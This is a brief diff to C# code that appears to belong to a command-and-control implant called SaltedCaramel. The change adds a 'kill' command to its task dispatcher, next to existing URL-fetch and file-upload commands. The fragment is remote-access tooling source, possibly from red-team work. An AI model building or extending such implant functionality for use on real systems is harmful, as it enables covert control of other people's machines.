@@ -52,6 +52,11 @@ namespace SaltedCaramel
                 Debug.WriteLine("[-] DispatchTask - Tasked to get url " + this.@params);
                 Request.Execute(this, implant);
             }
+            else if (this.command == "kill")
+            {
+                Debug.WriteLine("[-] DispatchTask - Tasked to kill PID " + this.@params);
+                Kill.Execute(this, implant);
+            }
             else if (this.command == "upload")
             {
                 Debug.WriteLine("[-] DispatchTask - Tasked to get file from server");
